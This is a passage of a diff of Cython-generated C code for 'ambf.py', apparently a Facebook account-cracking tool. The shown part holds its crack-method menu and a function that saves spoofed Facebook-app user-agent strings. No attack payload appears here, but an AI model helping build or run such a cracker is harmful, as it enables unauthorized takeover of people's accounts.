  * 	print(" \n [ pilih method crack - coba method satu ]\n")
  * 	print(" [1]. method API (mode fast)")             # <<<<<<<<<<<<<<
  * 	print(" [2]. method mbasic (mode slow)")
  * 	print(" [3]. method mobile (mode low)")
  */
-  if (__Pyx_PrintOne(0, __pyx_kp_s_1_method_API_mode_fast) < 0) __PYX_ERR(0, 540, __pyx_L1_error)
+  if (__Pyx_PrintOne(0, __pyx_kp_s_1_method_API_mode_fast) < 0) __PYX_ERR(0, 534, __pyx_L1_error)
 
-  /* "ambf.py":541
+  /* "ambf.py":535
  * 	print(" \n [ pilih method crack - coba method satu ]\n")
  * 	print(" [1]. method API (mode fast)")
  * 	print(" [2]. method mbasic (mode slow)")             # <<<<<<<<<<<<<<
  * 	print(" [3]. method mobile (mode low)")
  * 
  */
-  if (__Pyx_PrintOne(0, __pyx_kp_s_2_method_mbasic_mode_slow) < 0) __PYX_ERR(0, 541, __pyx_L1_error)
+  if (__Pyx_PrintOne(0, __pyx_kp_s_2_method_mbasic_mode_slow) < 0) __PYX_ERR(0, 535, __pyx_L1_error)
 
-  /* "ambf.py":542
+  /* "ambf.py":536
  * 	print(" [1]. method API (mode fast)")
  * 	print(" [2]. method mbasic (mode slow)")
  * 	print(" [3]. method mobile (mode low)")             # <<<<<<<<<<<<<<
  * 
  * def setting_ua():
  */
-  if (__Pyx_PrintOne(0, __pyx_kp_s_3_method_mobile_mode_low) < 0) __PYX_ERR(0, 542, __pyx_L1_error)
+  if (__Pyx_PrintOne(0, __pyx_kp_s_3_method_mobile_mode_low) < 0) __PYX_ERR(0, 536, __pyx_L1_error)
 
-  /* "ambf.py":538
+  /* "ambf.py":532
  * 	print(" [!] jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
  * 
  * def text_method():             # <<<<<<<<<<<<<<
@@ -17307,7 +17066,7 @@ static PyObject *__pyx_pf_4ambf_28text_method(CYTHON_UNUSED PyObject *__pyx_self
   return __pyx_r;
 }
 
-/* "ambf.py":544
+/* "ambf.py":538
  * 	print(" [3]. method mobile (mode low)")
  * 
  * def setting_ua():             # <<<<<<<<<<<<<<
@@ -17344,108 +17103,108 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
   int __pyx_clineno = 0;
   __Pyx_RefNannySetupContext("setting_ua", 0);
 
-  /* "ambf.py":545
+  /* "ambf.py":539
  * 
  * def setting_ua():
  * 	print("\n [ pilih user-agent hp anda ]\n")             # <<<<<<<<<<<<<<
  * 	print(" [1]. Xiaomi")
  * 	print(" [2]. Samsung")
  */
-  if (__Pyx_PrintOne(0, __pyx_kp_s_pilih_user_agent_hp_anda) < 0) __PYX_ERR(0, 545, __pyx_L1_error)
+  if (__Pyx_PrintOne(0, __pyx_kp_s_pilih_user_agent_hp_anda) < 0) __PYX_ERR(0, 539, __pyx_L1_error)
 
-  /* "ambf.py":546
+  /* "ambf.py":540
  * def setting_ua():
  * 	print("\n [ pilih user-agent hp anda ]\n")
  * 	print(" [1]. Xiaomi")             # <<<<<<<<<<<<<<
  * 	print(" [2]. Samsung")
  * 	print(" [3]. Nokia")
  */
-  if (__Pyx_PrintOne(0, __pyx_kp_s_1_Xiaomi) < 0) __PYX_ERR(0, 546, __pyx_L1_error)
+  if (__Pyx_PrintOne(0, __pyx_kp_s_1_Xiaomi) < 0) __PYX_ERR(0, 540, __pyx_L1_error)
 
-  /* "ambf.py":547
+  /* "ambf.py":541
  * 	print("\n [ pilih user-agent hp anda ]\n")
  * 	print(" [1]. Xiaomi")
  * 	print(" [2]. Samsung")             # <<<<<<<<<<<<<<
  * 	print(" [3]. Nokia")
  * 	print(" [4]. Asus")
  */
-  if (__Pyx_PrintOne(0, __pyx_kp_s_2_Samsung) < 0) __PYX_ERR(0, 547, __pyx_L1_error)
+  if (__Pyx_PrintOne(0, __pyx_kp_s_2_Samsung) < 0) __PYX_ERR(0, 541, __pyx_L1_error)
 
-  /* "ambf.py":548
+  /* "ambf.py":542
  * 	print(" [1]. Xiaomi")
  * 	print(" [2]. Samsung")
  * 	print(" [3]. Nokia")             # <<<<<<<<<<<<<<
  * 	print(" [4]. Asus")
  * 	print(" [5]. Huawei")
  */
-  if (__Pyx_PrintOne(0, __pyx_kp_s_3_Nokia) < 0) __PYX_ERR(0, 548, __pyx_L1_error)
+  if (__Pyx_PrintOne(0, __pyx_kp_s_3_Nokia) < 0) __PYX_ERR(0, 542, __pyx_L1_error)
 
-  /* "ambf.py":549
+  /* "ambf.py":543
  * 	print(" [2]. Samsung")
  * 	print(" [3]. Nokia")
  * 	print(" [4]. Asus")             # <<<<<<<<<<<<<<
  * 	print(" [5]. Huawei")
  * 	print(" [6]. Oppo")
  */
-  if (__Pyx_PrintOne(0, __pyx_kp_s_4_Asus) < 0) __PYX_ERR(0, 549, __pyx_L1_error)
+  if (__Pyx_PrintOne(0, __pyx_kp_s_4_Asus) < 0) __PYX_ERR(0, 543, __pyx_L1_error)
 
-  /* "ambf.py":550
+  /* "ambf.py":544
  * 	print(" [3]. Nokia")
  * 	print(" [4]. Asus")
  * 	print(" [5]. Huawei")             # <<<<<<<<<<<<<<
  * 	print(" [6]. Oppo")
  * 	print(" [7]. User-Agent Manual")
  */
-  if (__Pyx_PrintOne(0, __pyx_kp_s_5_Huawei) < 0) __PYX_ERR(0, 550, __pyx_L1_error)
+  if (__Pyx_PrintOne(0, __pyx_kp_s_5_Huawei) < 0) __PYX_ERR(0, 544, __pyx_L1_error)
 
-  /* "ambf.py":551
+  /* "ambf.py":545
  * 	print(" [4]. Asus")
  * 	print(" [5]. Huawei")
  * 	print(" [6]. Oppo")             # <<<<<<<<<<<<<<
  * 	print(" [7]. User-Agent Manual")
  * 	ua = input("\n [?] choose : ")
  */
-  if (__Pyx_PrintOne(0, __pyx_kp_s_6_Oppo) < 0) __PYX_ERR(0, 551, __pyx_L1_error)
+  if (__Pyx_PrintOne(0, __pyx_kp_s_6_Oppo) < 0) __PYX_ERR(0, 545, __pyx_L1_error)
 
-  /* "ambf.py":552
+  /* "ambf.py":546
  * 	print(" [5]. Huawei")
  * 	print(" [6]. Oppo")
  * 	print(" [7]. User-Agent Manual")             # <<<<<<<<<<<<<<
  * 	ua = input("\n [?] choose : ")
  * 	if ua =="":
  */
-  if (__Pyx_PrintOne(0, __pyx_kp_s_7_User_Agent_Manual) < 0) __PYX_ERR(0, 552, __pyx_L1_error)
+  if (__Pyx_PrintOne(0, __pyx_kp_s_7_User_Agent_Manual) < 0) __PYX_ERR(0, 546, __pyx_L1_error)
 
-  /* "ambf.py":553
+  /* "ambf.py":547
  * 	print(" [6]. Oppo")
  * 	print(" [7]. User-Agent Manual")
  * 	ua = input("\n [?] choose : ")             # <<<<<<<<<<<<<<
  * 	if ua =="":
  * 		menu()
  */
-  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__14, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 553, __pyx_L1_error)
+  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__14, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 547, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_1);
   __pyx_v_ua = __pyx_t_1;
   __pyx_t_1 = 0;
 
-  /* "ambf.py":554
+  /* "ambf.py":548
  * 	print(" [7]. User-Agent Manual")
  * 	ua = input("\n [?] choose : ")
  * 	if ua =="":             # <<<<<<<<<<<<<<
  * 		menu()
  * 	elif ua in ["1", "01"]:
  */
-  __pyx_t_2 = (__Pyx_PyString_Equals(__pyx_v_ua, __pyx_kp_s__7, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 554, __pyx_L1_error)
+  __pyx_t_2 = (__Pyx_PyString_Equals(__pyx_v_ua, __pyx_kp_s__7, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 548, __pyx_L1_error)
   if (__pyx_t_2) {
 
-    /* "ambf.py":555
+    /* "ambf.py":549
  * 	ua = input("\n [?] choose : ")
  * 	if ua =="":
  * 		menu()             # <<<<<<<<<<<<<<
  * 	elif ua in ["1", "01"]:
  * 		c_ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
  */
-    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_menu); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 555, __pyx_L1_error)
+    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_menu); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 549, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
     __pyx_t_4 = NULL;
     if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
@@ -17459,12 +17218,12 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
     __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
-    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 555, __pyx_L1_error)
+    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 549, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
-    /* "ambf.py":554
+    /* "ambf.py":548
  * 	print(" [7]. User-Agent Manual")
  * 	ua = input("\n [?] choose : ")
  * 	if ua =="":             # <<<<<<<<<<<<<<
@@ -17474,7 +17233,7 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     goto __pyx_L3;
   }
 
-  /* "ambf.py":556
+  /* "ambf.py":550
  * 	if ua =="":
  * 		menu()
  * 	elif ua in ["1", "01"]:             # <<<<<<<<<<<<<<
@@ -17483,20 +17242,20 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
  */
   __Pyx_INCREF(__pyx_v_ua);
   __pyx_t_1 = __pyx_v_ua;
-  __pyx_t_5 = (__Pyx_PyString_Equals(__pyx_t_1, __pyx_kp_s_1, Py_EQ)); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 556, __pyx_L1_error)
+  __pyx_t_5 = (__Pyx_PyString_Equals(__pyx_t_1, __pyx_kp_s_1, Py_EQ)); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 550, __pyx_L1_error)
   if (!__pyx_t_5) {
   } else {
     __pyx_t_2 = __pyx_t_5;
     goto __pyx_L4_bool_binop_done;
   }
-  __pyx_t_5 = (__Pyx_PyString_Equals(__pyx_t_1, __pyx_kp_s_01, Py_EQ)); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 556, __pyx_L1_error)
+  __pyx_t_5 = (__Pyx_PyString_Equals(__pyx_t_1, __pyx_kp_s_01, Py_EQ)); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 550, __pyx_L1_error)
   __pyx_t_2 = __pyx_t_5;
   __pyx_L4_bool_binop_done:;
   __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
   __pyx_t_5 = (__pyx_t_2 != 0);
   if (__pyx_t_5) {
 
-    /* "ambf.py":557
+    /* "ambf.py":551
  * 		menu()
  * 	elif ua in ["1", "01"]:
  * 		c_ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")             # <<<<<<<<<<<<<<
@@ -17506,16 +17265,16 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Linux_Android_10_Mi);
     __pyx_v_c_ua = __pyx_kp_s_Mozilla_5_0_Linux_Android_10_Mi;
 
-    /* "ambf.py":558
+    /* "ambf.py":552
  * 	elif ua in ["1", "01"]:
  * 		c_ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
  * 		open(".ua", "w").write(c_ua)             # <<<<<<<<<<<<<<
  * 		time.sleep(1)
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
  */
-    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__49, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 558, __pyx_L1_error)
+    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__49, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 552, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
-    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_write); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 558, __pyx_L1_error)
+    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_write); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 552, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
     __pyx_t_3 = NULL;
@@ -17530,21 +17289,21 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_3, __pyx_v_c_ua) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_v_c_ua);
     __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
-    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 558, __pyx_L1_error)
+    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 552, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
-    /* "ambf.py":559
+    /* "ambf.py":553
  * 		c_ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
  * 		open(".ua", "w").write(c_ua)
  * 		time.sleep(1)             # <<<<<<<<<<<<<<
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")
  */
-    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_time); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 559, __pyx_L1_error)
+    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_time); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 553, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
-    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_sleep); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 559, __pyx_L1_error)
+    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_sleep); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 553, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
     __pyx_t_4 = NULL;
@@ -17559,21 +17318,21 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_4, __pyx_int_1) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_int_1);
     __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
-    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 559, __pyx_L1_error)
+    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 553, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
-    /* "ambf.py":560
+    /* "ambf.py":554
  * 		open(".ua", "w").write(c_ua)
  * 		time.sleep(1)
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))             # <<<<<<<<<<<<<<
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()
  */
-    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__42, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 560, __pyx_L1_error)
+    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__42, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 554, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
-    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_read); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 560, __pyx_L1_error)
+    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_read); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 554, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
     __pyx_t_3 = NULL;
@@ -17588,34 +17347,34 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
     __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
-    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 560, __pyx_L1_error)
+    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 554, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
-    __pyx_t_4 = __Pyx_PyString_FormatSafe(__pyx_kp_s_user_agent_s, __pyx_t_1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 560, __pyx_L1_error)
+    __pyx_t_4 = __Pyx_PyString_FormatSafe(__pyx_kp_s_user_agent_s, __pyx_t_1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 554, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
-    if (__Pyx_PrintOne(0, __pyx_t_4) < 0) __PYX_ERR(0, 560, __pyx_L1_error)
+    if (__Pyx_PrintOne(0, __pyx_t_4) < 0) __PYX_ERR(0, 554, __pyx_L1_error)
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
 
-    /* "ambf.py":561
+    /* "ambf.py":555
  * 		time.sleep(1)
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")             # <<<<<<<<<<<<<<
  * 		menu()
  * 	elif ua in ["2", "02"]:
  */
-    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__50, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 561, __pyx_L1_error)
+    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__50, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 555, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
 
-    /* "ambf.py":562
+    /* "ambf.py":556
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()             # <<<<<<<<<<<<<<
  * 	elif ua in ["2", "02"]:
  * 		c_ua = ("Dalvik/2.1.0 (Linux; U; Android 11; SM-F700W Build/RP1A.200720.012; wv) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]")
  */
-    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_menu); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 562, __pyx_L1_error)
+    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_menu); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 556, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __pyx_t_3 = NULL;
     if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
@@ -17629,12 +17388,12 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_4 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
     __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
-    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 562, __pyx_L1_error)
+    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 556, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
 
-    /* "ambf.py":556
+    /* "ambf.py":550
  * 	if ua =="":
  * 		menu()
  * 	elif ua in ["1", "01"]:             # <<<<<<<<<<<<<<
@@ -17644,7 +17403,7 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     goto __pyx_L3;
   }
 
-  /* "ambf.py":563
+  /* "ambf.py":557
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()
  * 	elif ua in ["2", "02"]:             # <<<<<<<<<<<<<<
@@ -17653,20 +17412,20 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
  */
   __Pyx_INCREF(__pyx_v_ua);
   __pyx_t_4 = __pyx_v_ua;
-  __pyx_t_2 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_2, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 563, __pyx_L1_error)
+  __pyx_t_2 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_2, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 557, __pyx_L1_error)
   if (!__pyx_t_2) {
   } else {
     __pyx_t_5 = __pyx_t_2;
     goto __pyx_L6_bool_binop_done;
   }
-  __pyx_t_2 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_02, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 563, __pyx_L1_error)
+  __pyx_t_2 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_kp_s_02, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 557, __pyx_L1_error)
   __pyx_t_5 = __pyx_t_2;
   __pyx_L6_bool_binop_done:;
   __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
   __pyx_t_2 = (__pyx_t_5 != 0);
   if (__pyx_t_2) {
 
-    /* "ambf.py":564
+    /* "ambf.py":558
  * 		menu()
  * 	elif ua in ["2", "02"]:
  * 		c_ua = ("Dalvik/2.1.0 (Linux; U; Android 11; SM-F700W Build/RP1A.200720.012; wv) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]")             # <<<<<<<<<<<<<<
@@ -17676,16 +17435,16 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     __Pyx_INCREF(__pyx_kp_s_Dalvik_2_1_0_Linux_U_Android_11);
     __pyx_v_c_ua = __pyx_kp_s_Dalvik_2_1_0_Linux_U_Android_11;
 
-    /* "ambf.py":565
+    /* "ambf.py":559
  * 	elif ua in ["2", "02"]:
  * 		c_ua = ("Dalvik/2.1.0 (Linux; U; Android 11; SM-F700W Build/RP1A.200720.012; wv) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]")
  * 		open(".ua", "w").write(c_ua)             # <<<<<<<<<<<<<<
  * 		time.sleep(1)
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
  */
-    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__49, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 565, __pyx_L1_error)
+    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__49, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 559, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
-    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_write); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 565, __pyx_L1_error)
+    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_write); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 559, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
     __pyx_t_1 = NULL;
@@ -17700,21 +17459,21 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_4 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_1, __pyx_v_c_ua) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_v_c_ua);
     __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
-    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 565, __pyx_L1_error)
+    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 559, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
 
-    /* "ambf.py":566
+    /* "ambf.py":560
  * 		c_ua = ("Dalvik/2.1.0 (Linux; U; Android 11; SM-F700W Build/RP1A.200720.012; wv) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]")
  * 		open(".ua", "w").write(c_ua)
  * 		time.sleep(1)             # <<<<<<<<<<<<<<
  * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")
  */
-    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_time); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 566, __pyx_L1_error)
+    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_time); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 560, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
-    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_sleep); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 566, __pyx_L1_error)
+    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_sleep); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 560, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_1);
     __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
     __pyx_t_3 = NULL;
@@ -17729,21 +17488,21 @@ static PyObject *__pyx_pf_4ambf_30setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     }
     __pyx_t_4 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_3, __pyx_int_1) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_int_1);
     __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
-    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 566, __pyx_L1_error)
